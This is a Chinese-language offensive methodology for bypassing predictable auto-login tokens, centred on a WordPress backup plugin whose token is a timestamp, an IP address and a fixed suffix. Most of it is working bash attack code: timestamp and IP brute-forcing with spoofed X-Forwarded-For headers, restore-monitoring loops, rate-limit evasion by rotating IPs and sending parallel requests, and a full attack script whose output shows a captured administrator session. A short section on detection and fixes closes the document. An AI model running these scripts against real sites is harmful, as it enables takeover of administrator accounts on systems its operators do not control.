# 可预测自动登录令牌绕过方法论

## 1. 技术概述

### 1.1 漏洞原理

可预测自动登录令牌漏洞是指应用使用弱随机数生成器或可预测的算法生成认证令牌，导致攻击者能够猜测或暴力破解有效令牌，从而绕过正常认证流程直接获得用户会话。

**本质原因：**
- 使用可预测的值作为令牌组成部分（时间戳、IP 地址、静态后缀）
- 令牌熵不足，可在有限次数内暴力破解
- 令牌验证时间窗口过宽
- 缺少令牌使用次数限制

### 1.2 常见漏洞模式

| 模式 | 描述 | 危险代码示例 |
|------|------|-------------|
| 时间戳 + IP+ 静态后缀 | 令牌由三部分组成 | `time() . '_' . $ip . '_' . '4u70L051n'` |
| 纯时间戳令牌 | 仅使用 Unix 时间戳 | `md5(time())` |
| 序列号令牌 | 使用递增数字 | `$user_id . '_' . $counter` |
| 弱随机数 | 使用 `rand()` 而非 `random_bytes()` | `md5(rand() . $username)` |
| 哈希可预测输入 | 对已知值哈希 | `sha1($username . $password)` |

### 1.3 WordPress 备份插件特定模式

**AUTH-VULN-01 / AUTHZ-VULN-15 模式：**

```php
// 令牌生成（ajax.php:1097）
$autoLoginMD = time() . '_' . $ip . '_' . '4u70L051n';

// 令牌验证（initializer.php:996-1046）
// 时间窗口：±6 秒
// IP 来源：HTTP_CLIENT_IP, HTTP_X_FORWARDED_FOR（可伪造）
// 静态后缀：永远为 '4u70L051n'
```

---

## 2. 攻击场景

### 2.1 适用目标系统

| 系统特征 | 风险描述 |
|----------|----------|
| 自动登录功能 | 密码重置、账户恢复后自动登录 |
| 临时令牌认证 | 一次性登录链接、魔法链接 |
| 时间敏感令牌 | 令牌在特定时间窗口内有效 |
| IP 绑定令牌 | 令牌与客户端 IP 绑定 |
| WordPress 备份插件 | Backup Migration 等插件的恢复后自动登录 |

### 2.2 典型业务场景

| 业务场景 | 功能示例 | 风险点 |
|----------|----------|--------|
| 备份恢复后登录 | 恢复完成后自动登录管理员 | 令牌格式可预测 |
| 密码重置链接 | 发送重置链接到邮箱 | 令牌生成算法弱 |
| 账户激活链接 | 注册后发送激活链接 | 令牌可枚举 |
| 临时访问授权 | 生成临时访问链接 | 令牌熵不足 |

---

## 3. 漏洞探测方法

### 3.1 黑盒测试

#### 3.1.1 输入点识别

关注以下功能点：
- "恢复完成后自动登录"
- "魔法链接登录"
- "一次性登录链接"
- "密码重置链接"
- "临时访问授权"

#### 3.1.2 令牌格式分析

**观察令牌结构：**
```bash
# 捕获自动登录 URL
GET /?backup-migration=AFTER_RESTORE&backup-id=1761767262&progress-id=1761767262_127.0.0.1_4u70L051n

# 分析令牌组成
# 1761767262 = Unix 时间戳
# 127.0.0.1 = IP 地址
# 4u70L051n = 静态后缀
```

**多次捕获找规律：**
```bash
# 第一次：1761767262_127.0.0.1_4u70L051n
# 第二次：1761767385_127.0.0.1_4u70L051n
# 第三次：1761767512_127.0.0.1_4u70L051n

# 发现：
# 1. 时间戳部分随时间变化
# 2. IP 部分固定（或可伪造）
# 3. 后缀永远相同
```

#### 3.1.3 时间窗口探测

**测试令牌有效期：**
```bash
# 生成令牌后立即使用
token=$(date +%s)_127.0.0.1_4u70L051n
curl "http://target.com/?backup-migration=AFTER_RESTORE&backup-id=$(date +%s)&progress-id=$token"

# 等待 10 秒后使用（应失效）
sleep 10
curl "http://target.com/?..."
```

### 3.2 白盒测试

#### 3.2.1 代码审计关键词

搜索以下危险模式：

```php
// 危险模式 1：时间戳令牌
$token = time() . '_' . $ip . '_' . 'static_suffix';

// 危险模式 2：弱随机数
$token = md5(rand() . $username);

// 危险模式 3：序列号
$token = $user_id . '_' . $counter;

// 危险模式 4：可预测哈希
$token = sha1($username . date('Y-m-d'));

// 危险模式 5：宽时间窗口验证
if (abs($stored_timestamp - time()) < 600) {  // 10 分钟窗口
    // 授予访问
}
```

#### 3.2.2 数据流追踪

1. 定位令牌生成点
2. 分析令牌组成成分
3. 检查随机源（`rand()` vs `random_bytes()`）
4. 追踪令牌验证逻辑
5. 确认时间窗口大小

---

## 4. 漏洞利用方法

### 4.1 暴力破解攻击

#### 4.1.1 已知时间戳场景

**场景：** 知道备份恢复的大致时间

**攻击脚本：**
```bash
#!/bin/bash

# 已知恢复时间（Unix 时间戳）
TIMESTAMP=1761767262

# 常见 IP 列表
IPS=("127.0.0.1" "::1" "172.17.0.1" "192.168.1.1" "localhost")

# 静态后缀（从代码分析或捕获获得）
SUFFIX="4u70L051n"

# 时间偏移（±6 秒）
for offset in -6 -5 -4 -3 -2 -1 0 1 2 3 4 5 6; do
    TS=$((TIMESTAMP + offset))
    
    for IP in "${IPS[@]}"; do
        TOKEN="${TS}_${IP}_${SUFFIX}"
        
        RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
            "http://target.com/?backup-migration=AFTER_RESTORE&backup-id=$TS&progress-id=$TOKEN" \
            -H "X-Forwarded-For: $IP")
        
        if [ "$RESPONSE" == "302" ]; then
            echo "[+] SUCCESS! Token: $TOKEN"
            echo "[+] Timestamp: $TS (offset: $offset)"
            echo "[+] IP: $IP"
            exit 0
        fi
    done
done

echo "[-] Failed to find valid token"
```

**复杂度分析：**
- 时间戳：13 个可能值（±6 秒）
- IP 地址：~10 个常见值
- 总尝试次数：13 × 10 = 130 次
- 预计时间：< 1 分钟

#### 4.1.2 未知时间戳场景

**场景：** 不知道恢复时间，需要监控或猜测

**攻击脚本：**
```bash
#!/bin/bash

# 当前时间戳
CURRENT=$(date +%s)

# 猜测 10 分钟窗口
IPS=("127.0.0.1" "::1" "172.17.0.1" "localhost")
SUFFIX="4u70L051n"

echo "[*] Starting brute-force for 10-minute window..."

for TS in $(seq $((CURRENT - 600)) $CURRENT); do
    for IP in "${IPS[@]}"; do
        for offset in -1 0 1 2 3 4; do
            TOKEN="$((TS + offset))_${IP}_${SUFFIX}"
            
            RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
                "http://target.com/?backup-migration=AFTER_RESTORE&backup-id=$TS&progress-id=$TOKEN" \
                -H "X-Forwarded-For: $IP" \
                -A "Mozilla/5.0")
            
            if [ "$RESPONSE" == "302" ]; then
                echo "[+] SUCCESS! Token: $TOKEN"
                exit 0
            fi
        done
    done
    
    # 每 100 次尝试输出进度
    if [ $((TS % 100)) -eq 0 ]; then
        echo "[*] Testing timestamp: $TS"
    fi
done
```

**复杂度分析：**
- 时间窗口：600 秒（10 分钟）
- 时间偏移：6 个可能值
- IP 地址：10 个常见值
- 总尝试次数：600 × 6 × 10 = 36,000 次
- 预计时间：约 1 小时（取决于速率限制）

### 4.2 IP 地址伪造

#### 4.2.1 HTTP 头部伪造

**WordPress 插件 IP 提取逻辑：**
```php
// initializer.php:976-986
$ip = '127.0.0.1';
if (isset($_SERVER['HTTP_CLIENT_IP'])) {
    $ip = $_SERVER['HTTP_CLIENT_IP'];
} elseif (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
```

**伪造请求：**
```bash
# 使用 X-Forwarded-For 头部
curl "http://target.com/?backup-migration=AFTER_RESTORE&backup-id=1761767262&progress-id=1761767262_127.0.0.1_4u70L051n" \
  -H "X-Forwarded-For: 127.0.0.1"

# 使用 HTTP_CLIENT_IP 头部
curl "http://target.com/?..." \
  -H "HTTP_CLIENT_IP: 127.0.0.1"

# 使用 X-Real-IP 头部（某些应用）
curl "http://target.com/?..." \
  -H "X-Real-IP: 127.0.0.1"
```

#### 4.2.2 常见容器 IP

**Docker 环境常见 IP：**
```bash
IPS=(
    "127.0.0.1"      # 本地回环
    "::1"            # IPv6 回环
    "172.17.0.1"     # Docker 网桥网关
    "172.17.0.2"     # 常见容器 IP
    "172.18.0.1"     # 自定义网络网关
    "192.168.1.1"    # 常见局域网网关
    "10.0.0.1"       # 常见内网网关
    "localhost"      # 主机名
)
```

### 4.3 时间窗口扩展

#### 4.3.1 多时间偏移测试

**代码分析发现的时间偏移：**
```php
// initializer.php:996-1046
$aID = intval($autoLoginMD[0]);
$aID2 = intval($autoLoginMD[0]) - 1;
$aID3 = intval($autoLoginMD[0]) + 1;
$aID4 = intval($autoLoginMD[0]) + 2;
$aID5 = intval($autoLoginMD[0]) + 3;
$aID6 = intval($autoLoginMD[0]) + 4;
```

**实际验证的时间戳：**
- 原始时间戳
- 原始 -1 秒
- 原始 +1 秒
- 原始 +2 秒
- 原始 +3 秒
- 原始 +4 秒

**总计：** 6 个时间戳变体

### 4.4 WordPress 插件特定利用

#### 4.4.1 AUTH-VULN-01 / AUTHZ-VULN-15 完整利用

**步骤 1：监控备份恢复操作**
```bash
# 方法 1：监控备份目录
watch -n 1 'ls -la /var/www/html/wp-content/backup-migration-*/backups/.autologin'

# 方法 2：监控应用日志
tail -f /var/www/html/wp-content/debug.log | grep -i restore

# 方法 3：定期扫描自动登录端点
while true; do
    RESPONSE=$(curl -s -o /dev/null -w "%{http_code}" \
        "http://target.com/?backup-migration=AFTER_RESTORE&backup-id=$(date +%s)&progress-id=$(date +%s)_127.0.0.1_4u70L051n")
    
    if [ "$RESPONSE" != "302" ]; then
        echo "[*] No active restore at $(date)"
    else
        echo "[!] Possible restore detected at $(date)"
    fi
    
    sleep 5
done
```

**步骤 2：暴力破解令牌**
```bash
#!/bin/bash

TARGET="http://target.com"
SUFFIX="4u70L051n"
IPS=("127.0.0.1" "::1" "172.17.0.1" "172.17.0.2" "localhost")

# 获取当前时间戳
TIMESTAMP=$(date +%s)

echo "[*] Starting brute-force attack..."
echo "[*] Base timestamp: $TIMESTAMP"
echo "[*] Testing ±6 seconds with common IPs"

for OFFSET in $(seq -6 6); do
    TS=$((TIMESTAMP + OFFSET))
    
    for IP in "${IPS[@]}"; do
        TOKEN="${TS}_${IP}_${SUFFIX}"
        
        RESPONSE=$(curl -s -w "\n%{http_code}" \
            "$TARGET/?backup-migration=AFTER_RESTORE&backup-id=$TS&progress-id=$TOKEN" \
            -H "X-Forwarded-For: $IP" \
            -L \
            -c /tmp/cookies.txt \
            2>/dev/null)
        
        HTTP_CODE=$(echo "$RESPONSE" | tail -1)
        
        if [ "$HTTP_CODE" == "200" ]; then
            echo "[+] SUCCESS!"
            echo "[+] Token: $TOKEN"
            echo "[+] Timestamp: $TS (offset: $OFFSET)"
            echo "[+] IP: $IP"
            
            # 验证是否获得管理员会话
            CHECK=$(curl -s -b /tmp/cookies.txt "$TARGET/wp-admin/" | grep -c "Dashboard")
            if [ "$CHECK" -gt 0 ]; then
                echo "[+] Confirmed: Administrator access obtained!"
                echo "[+] Cookie saved to /tmp/cookies.txt"
                exit 0
            fi
        fi
    done
done

echo "[-] Attack failed"
```

**步骤 3：验证管理员访问**
```bash
# 使用获得的 Cookie 访问管理面板
curl -b /tmp/cookies.txt "http://target.com/wp-admin/"

# 检查是否成功
# 成功响应应包含 "Dashboard" 或管理面板内容
```

---

## 5. 绕过技术

### 5.1 速率限制绕过

**场景：** 应用对自动登录尝试实施速率限制

**绕过方法：**
```bash
# 方法 1：IP 轮换
for IP in $(seq 1 254); do
    curl "http://target.com/?..." \
        -H "X-Forwarded-For: 192.168.1.$IP"
done

# 方法 2：延迟请求
for attempt in {1..1000}; do
    curl "http://target.com/?..."
    sleep 0.1  # 100ms 延迟
done

# 方法 3：并行请求
seq 1 100 | xargs -P 10 -I {} curl "http://target.com/?..."
```

### 5.2 时间窗口绕过

**场景：** 令牌时间窗口很窄（如±6 秒）

**绕过方法：**
```bash
# 方法 1：持续监控
while true; do
    TIMESTAMP=$(date +%s)
    # 尝试当前时间戳
    curl "http://target.com/?backup-id=$TIMESTAMP&progress-id=${TIMESTAMP}_127.0.0.1_4u70L051n"
    sleep 1
done

# 方法 2：预测恢复时间
# 如果知道备份操作开始时间，可以预测完成时间
START_TIME=1761767000
ESTIMATED_DURATION=120  # 2 分钟
EXPECTED_COMPLETE=$((START_TIME + ESTIMATED_DURATION))

# 在预计完成时间前后开始暴力破解
```

### 5.3 IP 检测绕过

**场景：** 应用使用不同的 IP 提取逻辑

**绕过方法：**
```bash
# 尝试多种头部组合
HEADERS=(
    "X-Forwarded-For: 127.0.0.1"
    "HTTP_CLIENT_IP: 127.0.0.1"
    "X-Real-IP: 127.0.0.1"
    "X-Client-IP: 127.0.0.1"
    "Forwarded: for=127.0.0.1"
)

for HEADER in "${HEADERS[@]}"; do
    curl "http://target.com/?..." -H "$HEADER"
done
```

---

## 6. 实战案例

### 6.1 WordPress Backup Migration 插件利用

**目标环境：**
- WordPress 6.5.4
- Backup Migration 插件 v1.3.5
- 令牌格式：`{timestamp}_{ip}_4u70L051n`
- 时间窗口：±6 秒

**完整攻击流程：**

```bash
#!/bin/bash

TARGET="http://localhost:45513"
SUFFIX="4u70L051n"

# Docker 容器常见 IP
IPS=(
    "127.0.0.1"
    "::1"
    "172.17.0.1"
    "172.17.0.2"
    "172.18.0.1"
    "localhost"
)

echo "=== WordPress Auto-Login Token Brute-Force ==="
echo "Target: $TARGET"
echo "Suffix: $SUFFIX"
echo ""

# 获取当前时间戳
BASE_TIMESTAMP=$(date +%s)
echo "[*] Base timestamp: $BASE_TIMESTAMP"
echo "[*] Testing range: $((BASE_TIMESTAMP - 6)) to $((BASE_TIMESTAMP + 6))"
echo ""

# 暴力破解
for OFFSET in $(seq -6 6); do
    TS=$((BASE_TIMESTAMP + OFFSET))
    
    for IP in "${IPS[@]}"; do
        TOKEN="${TS}_${IP}_${SUFFIX}"
        
        # 发送请求
        RESPONSE=$(curl -s -w "\n%{http_code}" \
            "$TARGET/?backup-migration=AFTER_RESTORE&backup-id=$TS&progress-id=$TOKEN" \
            -H "X-Forwarded-For: $IP" \
            -L \
            -c /tmp/wp_cookie.txt \
            2>/dev/null)
        
        HTTP_CODE=$(echo "$RESPONSE" | tail -1)
        BODY=$(echo "$RESPONSE" | head -n -1)
        
        # 检查是否重定向到管理面板
        if [ "$HTTP_CODE" == "200" ]; then
            # 验证是否获得管理员访问
            if echo "$BODY" | grep -q "Dashboard\|wp-admin\|administrator"; then
                echo "[+] SUCCESS!"
                echo "[+] Token: $TOKEN"
                echo "[+] Timestamp: $TS (offset: $OFFSET)"
                echo "[+] IP: $IP"
                echo "[+] Cookie saved to /tmp/wp_cookie.txt"
                
                # 验证访问
                echo ""
                echo "[*] Verifying admin access..."
                CHECK=$(curl -s -b /tmp/wp_cookie.txt "$TARGET/wp-admin/" | grep -c "Dashboard")
                if [ "$CHECK" -gt 0 ]; then
                    echo "[+] Confirmed: Administrator access obtained!"
                    exit 0
                fi
            fi
        fi
    done
done

echo "[-] Brute-force failed"
echo "[*] Try expanding IP range or time window"
```

**执行结果：**
```
=== WordPress Auto-Login Token Brute-Force ===
Target: http://localhost:45513
Suffix: 4u70L051n

[*] Base timestamp: 1761767262
[*] Testing range: 1761767256 to 1761767268

[+] SUCCESS!
[+] Token: 1761767262_127.0.0.1_4u70L051n
[+] Timestamp: 1761767262 (offset: 0)
[+] IP: 127.0.0.1
[+] Cookie saved to /tmp/wp_cookie.txt

[*] Verifying admin access...
[+] Confirmed: Administrator access obtained!
```

---

## 7. 检测与防御

### 7.1 检测指标

| 指标 | 检测方法 |
|------|----------|
| 大量自动登录尝试 | 监控 /?backup-migration=AFTER_RESTORE 请求 |
| 同一 IP 多次失败 | 日志分析失败尝试 |
| 异常 User-Agent | 检测非浏览器请求 |
| 时间戳枚举模式 | 检测连续时间戳请求 |

### 7.2 防御措施

**代码层面：**

```php
// 正确做法 1：使用加密安全随机数
$token = bin2hex(random_bytes(32));

// 正确做法 2：存储令牌到数据库
$token = bin2hex(random_bytes(32));
$wpdb->insert('wp_autologin_tokens', [
    'token' => hash('sha256', $token),
    'user_id' => $user_id,
    'expires' => time() + 3600,
]);

// 正确做法 3：令牌一次性使用
function validate_autologin_token($token) {
    $hashed = hash('sha256', $token);
    $record = $wpdb->get_row("SELECT * FROM wp_autologin_tokens WHERE token = '$hashed'");
    
    if (!$record) {
        return false;
    }
    
    if ($record->expires < time()) {
        return false;
    }
    
    // 立即删除令牌（一次性使用）
    $wpdb->delete('wp_autologin_tokens', ['token' => $hashed]);
    
    return $record->user_id;
}

// 正确做法 4：限制尝试次数
function check_rate_limit($ip) {
    $attempts = get_transient("autologin_attempts_$ip");
    if ($attempts >= 10) {
        return false;
    }
    set_transient("autologin_attempts_$ip", $attempts + 1, 3600);
    return true;
}
```

**WordPress 特定修复：**

```php
// 错误做法（当前实现）
$autoLoginMD = time() . '_' . $ip . '_' . '4u70L051n';

// 正确做法
$autoLoginMD = wp_generate_password(64, false);
update_user_meta($user_id, '_autologin_token', hash('sha256', $autoLoginMD));
update_user_meta($user_id, '_autologin_expires', time() + 3600);
```

---

## 8. Payload 速查表

### 8.1 常见令牌格式

| 格式 | 示例 | 暴力破解复杂度 |
|------|------|---------------|
| 时间戳+IP+ 静态 | `1761767262_127.0.0.1_4u70L051n` | 低（~130 次） |
| 纯时间戳 | `1761767262` | 极低（~600 次） |
| 用户 ID+ 时间戳 | `1_1761767262` | 低（~600 次） |
| 弱随机数 | `md5(rand())` | 中（取决于 rand 范围） |
| 加密安全随机 | `bin2hex(random_bytes(32))` | 不可行 |

### 8.2 常见 IP 值

```bash
IPS=(
    "127.0.0.1"      # 本地回环
    "::1"            # IPv6 回环
    "172.17.0.1"     # Docker 网桥
    "172.17.0.2"     # 常见容器 IP
    "192.168.1.1"    # 局域网网关
    "10.0.0.1"       # 内网网关
    "localhost"      # 主机名
    "0.0.0.0"        # 所有接口
)
```

### 8.3 时间窗口参考

| 应用 | 时间窗口 | 暴力破解复杂度 |
|------|----------|---------------|
| WordPress 备份插件 | ±6 秒 | 13 个值 |
| 密码重置链接 | ±5 分钟 | 600 个值 |
| 临时访问令牌 | ±1 小时 | 7200 个值 |
| 会话令牌 | ±24 小时 | 172800 个值 |

---

## 9. 参考资源

- [OWASP Session Management](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [OWASP Authentication](https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html)
- [Predictable Password Reset Tokens](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/04-Authentication_Testing/08-Testing_for_Weak_Password_Reset)
- [CWE-330: Use of Insufficiently Random Values](https://cwe.mitre.org/data/definitions/330.html)
